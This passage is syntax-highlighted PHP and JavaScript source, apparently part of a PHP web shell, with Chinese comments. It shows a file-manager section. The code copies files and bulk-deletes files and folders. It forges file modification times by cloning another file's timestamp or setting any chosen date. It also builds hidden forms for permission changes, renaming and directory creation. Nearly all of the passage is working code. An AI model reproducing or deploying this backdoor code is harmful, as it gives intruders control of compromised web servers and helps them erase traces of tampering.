#66cccc;\">'The goal file has already existed or original file does not exist<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">m(basename(<\/span>$<span style=\"color: #ffcc66;\">tofile<\/span>).<span style=\"color: #66cccc;\">' copied '<\/span>.(@<span style=\"color: #cccccc; background-color: #2d2d2d;\">copy(<\/span>$<span style=\"color: #ffcc66;\">sname<\/span>,$<span style=\"color: #ffcc66;\">tofile<\/span>) ? <span style=\"color: #cccccc; background-color: #2d2d2d;\">basename(<\/span>$<span style=\"color: #ffcc66;\">to<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">file<\/span><span style=\"text-decoration: underline;\">).<\/span><span style=\"color: #66cccc; text-decoration: underline;\">' success'<\/span><span style=\"text-decoration: underline;\"> : <\/span><span style=\"color: #66cccc; text-decoration: underline;\">'failed'<\/span><span style=\"text-decoration: underline;\">));<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#20811;&#38534;&#26102;&#38388;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">elseif<\/span> ($<span style=\"color: #ffcc66;\">curfile<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">tarfile<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (!@<span style=\"color: #cccccc; background-color: #2d2d2d;\">file_exists(<\/span>$<span style=\"color: #ffcc66;\">curfile<\/span>) || !@<span style=\"color: #cccccc; background-color: #2d2d2d;\">file_exists(<\/span>$<span style=\"color: #ffcc66;\">tarfile<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">m(<\/span><span style=\"color: #66cccc;\">'The goal file has already existed or original file does not exist<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">time<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">filemtime(<\/span>$<span style=\"color: #ffcc66;\">tarfile<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">m(<\/span><span style=\"color: #66cccc;\">'Modify file the last modified '<\/span>.(@<span style=\"color: #cccccc; background-color: #2d2d2d;\">touch(<\/span>$<span style=\"color: #ffcc66;\">curfile<\/span>,$<span style=\"color: #ffcc66;\">time<\/span>,$<span style=\"color: #ffcc66;\">time<\/span>) ? <span style=\"color: #66cccc;\">'<\/span><span style=\"color: #66cccc; text-decoration: underline;\">success'<\/span><span style=\"text-decoration: underline;\"> : <\/span><span style=\"color: #66cccc; text-decoration: underline;\">'failed'<\/span><span style=\"text-decoration: underline;\">));<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#33258;&#23450;&#20041;&#26102;&#38388;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">elseif<\/span> ($<span style=\"color: #ffcc66;\">curfile<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">year<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">month<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">day<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">hour<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">minute<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">second<\/span>) <span style=\"text-decoration: underline;\">{<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (!@<span style=\"color: #cccccc; background-color: #2d2d2d;\">file_exists(<\/span>$<span style=\"color: #ffcc66;\">curfile<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">m(basename(<\/span>$<span style=\"color: #ffcc66;\">curfile<\/span>).<span style=\"color: #66cccc;\">' does not exist'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">time<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">strtotime(<\/span><span style=\"color: #66cccc;\">\"$year-$month-$day $hour:$minute:$second\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">m(<\/span><span style=\"color: #66cccc;\">'Modify file the last modified '<\/span>.(@<span style=\"color: #cccccc; background-color: #2d2d2d;\">touch(<\/span>$<span style=\"color: #ffcc66;\">curfile<\/span>,$<span style=\"color: #ffcc66;\">time<\/span>,$<span style=\"color: #ffcc66;\">time<\/span>) ? <span style=\"color: #66cccc;\">'<\/span><span style=\"color: #66cccc; text-decoration: underline;\">success'<\/span><span style=\"text-decoration: underline;\"> : <\/span><span style=\"color: #66cccc; text-decoration: underline;\">'failed'<\/span><span style=\"text-decoration: underline;\">));<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#25209;&#37327;&#21024;&#38500;&#25991;&#20214;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">elseif<\/span>($<span style=\"color: #ffcc66;\">doing<\/span> == <span style=\"color: #66cccc;\">'delfiles'<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">dl<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">dfiles<\/span>=<span style=\"color: #66cccc;\">''<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">succ<\/span> = $<span style=\"color: #ffcc66;\">fail<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">foreach<\/span> ($<span style=\"color: #ffcc66;\">dl<\/span> <span style=\"color: #99cc99;\">as<\/span> $<span style=\"color: #ffcc66;\">filepath<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (<span style=\"color: #cccccc; background-color: #2d2d2d;\">is_dir(<\/span>$<span style=\"color: #ffcc66;\">filepath<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (@<span style=\"color: #cccccc; background-color: #2d2d2d;\">deltree(<\/span>$<span style=\"color: #ffcc66;\">filepath<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">succ<\/span>++;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">fail<\/span>++;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (@<span style=\"color: #cccccc; background-color: #2d2d2d;\">unlink(<\/span>$<span style=\"color: #ffcc66;\">filepath<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">succ<\/span>++;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">fail<\/span>++;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">m(<\/span><span style=\"color: #66cccc;\">'Deleted folder\/file have finished,choose '<\/span>.<span style=\"color: #cccccc; background-color: #2d2d2d;\">count(<\/span>$<span style=\"color: #ffcc66;\">dl<\/span>).<span style=\"color: #66cccc;\">' success '<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">succ<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">' fail '<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">fail<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">m(<\/span><span style=\"color: #66cccc;\">'Please select folder\/file(s)'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">&#25805;&#20316;&#23436;&#27605;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formhead(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=<span style=\"color: #6699cc;\">&gt;<\/span><span style=\"color: #66cccc;\">'createdir'<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'newdirname'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'dir'<\/span>,$<span style=\"color: #ffcc66;\">nowpath<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formfoot(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formhead(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'fileperm'<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'newperm'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'pfile'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'dir'<\/span>,$<span style=\"color: #ffcc66;\">nowpath<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formfoot(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formhead(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'copyfile'<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'sname'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'tofile'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'dir'<\/span>,$<span style=\"color: #ffcc66;\">nowpath<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formfoot(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formhead(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'rename'<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'oldname'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'newfilename'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'dir'<\/span>,$<span style=\"color: #ffcc66;\">nowpath<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formfoot(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formhead(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'fileopform'<\/span>, <span style=\"color: #66cccc;\">'target'<\/span>=&gt;<span style=\"color: #66cccc;\">'_blank'<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'action'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'opfile'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'dir'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formfoot(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formhead(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'getsize'<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'getdir'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'dir'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formfoot(<\/span>);\n\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">free<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">disk_free_space(<\/span>$<span style=\"color: #ffcc66;\">nowpath<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   !$<span style=\"color: #ffcc66;\">free<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">free<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">all<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">disk_total_space(<\/span>$<span style=\"color: #ffcc66;\">nowpath<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   !$<span style=\"color: #ffcc66;\">all<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">all<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">used<\/span> = $<span style=\"color: #ffcc66;\">all<\/span>-$<span style=\"color: #ffcc66;\">free<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;h2&gt;File Manager - Current disk free '<\/span>.<span style=\"color: #cccccc; background-color: #2d2d2d;\">sizecount(<\/span>$<span style=\"color: #ffcc66;\">free<\/span>).<span style=\"color: #66cccc;\">' of '<\/span>.<span style=\"color: #cccccc; background-color: #2d2d2d;\">sizecount(<\/span><span style=\"text-decoration: underline;\">$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">all<\/span><span style=\"text-decoration: underline;\">).<\/span><span style=\"color: #66cccc; text-decoration: underline;\">' ('<\/span><span style=\"text-decoration: underline;\">.@<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">round(100<\/span><span style=\"text-decoration: underline;\">\/($<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">all<\/span><span style=\"text-decoration: underline;\">\/$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">free<\/span><span style=\"text-decoration: underline;\">),<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">2<\/span><span style=\"text-decoration: underline;\">).<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'%)&lt;\/h2&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">cwd_links<\/span> = <span style=\"color: #66cccc;\">''<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">path<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">explode(<\/span><span style=\"color: #66cccc;\">'\/'<\/span>, $<span style=\"color: #ffcc66;\">nowpath<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">n<\/span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">count(<\/span>$<span style=\"color: #ffcc66;\">path<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">for<\/span>($<span style=\"color: #ffcc66;\">i<\/span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>;$<span style=\"color: #ffcc66;\">i<\/span>&lt;$<span style=\"color: #ffcc66;\">n<\/span>-<span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>;$<span style=\"color: #ffcc66;\">i<\/span>++) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">cwd_links<\/span> .= <span style=\"color: #66cccc;\">'&lt;a href=\"javascript:godir(\\''<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">for<\/span>($<span style=\"color: #ffcc66;\">j<\/span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>;$<span style=\"color: #ffcc66;\">j<\/span>&lt;=$<span style=\"color: #ffcc66;\">i<\/span>;$<span style=\"color: #ffcc66;\">j<\/span>++) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">cwd_links<\/span> .= $<span style=\"color: #ffcc66;\">path<\/span>[$<span style=\"color: #ffcc66;\">j<\/span>].<span style=\"color: #66cccc;\">'\/'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">cwd_links<\/span> .= <span style=\"color: #66cccc;\">'\\');\"&gt;'<\/span>.$<span style=\"color: #ffcc66;\">path<\/span>[$<span style=\"color: #ffcc66;\">i<\/span>].<span style=\"color: #66cccc;\">'\/&lt;\/a&gt;'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"color: #cc99cc;\">?&gt;<\/span>\n<span style=\"color: #6699cc;\">&lt;script<\/span> <span style=\"color: #6699cc;\">type=<\/span><span style=\"color: #66cccc;\">\"text\/javascript\"<\/span><span style=\"color: #6699cc;\">&gt;<\/span>\n<span style=\"color: #f2777a; font-weight: bold;\">document<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">onclick<\/span> = <span style=\"color: #f2777a; font-weight: bold;\">shownav<\/span>;\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">shownav<\/span>(<span style=\"color: #f2777a; font-weight: bold;\">e<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #f2777a; font-weight: bold;\">src<\/span> = <span style=\"color: #f2777a; font-weight: bold;\">e<\/span>?<span style=\"color: #f2777a; font-weight: bold;\">e<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">target<\/span>:<span style=\"color: #f2777a; font-weight: bold;\">event<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">srcElement<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">do<\/span>{\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(<span style=\"color: #f2777a; font-weight: bold;\">src<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">id<\/span> ==<span style=\"color: #66cccc;\">\"jumpto\"<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'inputnav'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">style<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">display<\/span> = <span style=\"color: #66cccc;\">\"\"<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'pathnav'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">style<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">display<\/span> = <span style=\"color: #66cccc;\">\"none\"<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">hidenav();<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(<span style=\"color: #f2777a; font-weight: bold;\">src<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">id<\/span> ==<span style=\"color: #66cccc;\">\"inputnav\"<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #f2777a; font-weight: bold;\">src<\/span> = <span style=\"color: #f2777a; font-weight: bold;\">src<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">parentNode<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   }<span style=\"color: #99cc99;\">while<\/span>(<span style=\"color: #f2777a; font-weight: bold;\">src<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">parentNode<\/span>)\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'inputnav'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">style<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">display<\/span> = <span style=\"color: #66cccc;\">\"none\"<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'pathnav'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">style<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">display<\/span> = <span style=\"color: #66cccc;\">\"\"<\/span>;\n}\n<span style=\"color: #6699cc;\">&lt;\/script&gt;<\/span>\n<span style=\"color: #6699cc;\">&lt;div<\/span> <span style=\"color: #6699cc;\">style=<\/span><span style=\"color: #66cccc;\">\"background:#eee;margin-bottom:10px;\"<\/span><span style=\"color: #6699cc;\">&gt;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;table<\/span> <span style=\"color: #6699cc;\">id=<\/span><span style=\"color: #66cccc;\">\"pathnav\"<\/span> <span style=\"color: 